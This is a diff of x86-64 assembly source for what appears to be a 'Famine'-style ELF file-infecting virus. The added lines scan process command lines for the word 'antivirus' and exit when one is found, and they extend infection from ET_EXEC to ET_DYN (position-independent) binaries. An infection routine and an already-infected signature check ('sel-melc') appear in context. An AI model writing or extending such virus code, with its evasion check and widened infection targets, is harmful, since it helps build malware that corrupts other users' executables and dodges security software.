@@ -265,6 +265,9 @@ check_cmdline:
 	; Ok now we have our full path ready to be read
 	lea rdi, [rsp]
 	call check_cmdline_content; will actually read the file
+	cmp rax, 0
+	jne exit_prog ;antivirus is running
+
 	add rsp, 64
 	pop rdx
 	pop rbx
@@ -273,8 +276,66 @@ check_cmdline:
 retn
 ;  int check_cmdline_content(char *path)
 check_cmdline_content:
+	push rbx
+	push rcx
+	push r8
+	push r9
+	push r10
+	push rsi
+	push rdx
+	push rdi
 
+
+	call open_file
+	mov rdi, rax; store fd in rdi
+	sub rsp, 1 
+	xor rcx, rcx
+	mov rcx, 0x0073 ; "s\0"
+	push rcx
+	mov rcx, 0x7572697669746e61 ; "antiviru"
+	push rcx
+	xor rcx, rcx
+	loop_ccc:
+		lea rsi, [rsp + 16]
+		mov rdx, 1; read one byte at the time
+		mov rax, 0
+		push rcx ; save rcx coz fcking syscall will modify it
+		syscall; read(rdi, rsi, rdx);
+		pop rcx
+		cmp rax, 0
+		je end_of_ccc
+		mov dl, [rsp + rcx]
+		cmp byte[rsp + 16], dl
+		jne reset_rcx_ccc
+		inc rcx
+		cmp rcx, 9 ;antivirus 8 bytes long
+		je ccc_found
+		jmp loop_ccc
+		reset_rcx_ccc:
+			xor rcx, rcx
+			jmp loop_ccc
+	ccc_not_found:
+		mov rax, 0
+		jmp end_of_ccc
+	ccc_found :
+		mov rax, 1
+	end_of_ccc:
+		add rsp, 17
+		push rax;save return val
+		mov rax, 3
+		syscall
+		pop rax;restore return val
+	
+	pop rdi
+	pop rdx
+	pop rsi
+	pop r10
+	pop r9
+	pop r8
+	pop rcx
+	pop rbx
 retn
+
 ft_strlen:
 	xor rax, rax
 	loop:
@@ -380,7 +441,10 @@ famine_file:
 	cmp byte[rax + 3], 'F'
 	jne leave_famine_file
 	cmp WORD[rax + 16], 2;e_type , 2 == ET_EXEC
+	je elf_goodfile
+	cmp WORD[rax + 16], 3; e_type ET_DYN
 	jne obj_file
+	elf_goodfile:
 	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
 	jne file32bit
 	;64BIT FILE
@@ -470,7 +534,7 @@ check_already_infected:
 
 	call open_file
 	mov rdi, rax; store fd in rdi
-	sub rsp, 1
+	sub rsp, 1 
 	mov rcx, 0x636c656d2d6c6573 ; "sel-melc"
 	push rcx
 	xor rcx, rcx
